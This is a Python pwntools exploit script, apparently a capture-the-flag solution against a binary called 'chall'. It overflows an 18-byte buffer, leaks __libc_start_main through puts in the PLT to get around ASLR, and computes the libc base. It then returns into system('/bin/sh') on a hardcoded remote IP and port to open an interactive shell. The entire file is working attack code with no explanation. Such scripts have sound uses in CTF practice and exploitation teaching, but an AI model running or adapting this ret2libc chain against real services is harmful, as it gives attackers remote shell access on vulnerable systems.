from pwn import *
import time

main = p32 (0x080491df)
p = 0
elf = 0

def padding ():
    payload = b'a'*18
    return payload

def leak_payload (str_leak):
    ## LEAKING LIBC
    puts = p32 (elf.plt ['puts'])
    leak = p32 (elf.got [str_leak])

    payload = padding ()
    payload += puts
    payload += main
    payload += leak

    return payload

def get_leak ():
    leaked = p.recvline ()
    #getting rid of \n
    #print (p.clean ())
    leaked = leaked [:4]
    log.info ('leaked: %s' % leaked)
    return u32 (leaked.ljust (4, b'\x00'))

def shell_payload (leak):
    #libc = ELF ('/lib32/libc.so.6')
    libc = ELF ('./libc6-i386_2.28-10_amd64.so')
    libc.address = leak - libc.sym ['__libc_start_main']

    sh = p32 (next (libc.search (b'/bin/sh')))
    system = p32 (libc.sym ['system'])

    payload = padding ()
    payload += system
    payload += main
    payload += sh

    return payload

def init ():
    global p
    global elf
    p = remote ('168.119.123.141', 8090)
    #p = process ('./chall')
    elf = ELF ('./chall')
    p.recvuntil (b' ..\n')

init ()

log.success ('init successfully')

#by passing aslr and ret2libc
log.info ('sending payload')
payload = leak_payload ('__libc_start_main')
p.sendline (payload)
leak = get_leak ()
log.success ('__libc_start_main: %s' % hex (leak))


'''
print (b'cleaning: ' + p.clean ())
log.info ('sending payload')
payload = leak_payload ('gets')
p.sendline (payload)
leak = get_leak ()
log.success ('gets: %s' % hex (leak))
'''


payload = shell_payload (leak)
p.sendline (payload)
p.interactive ()
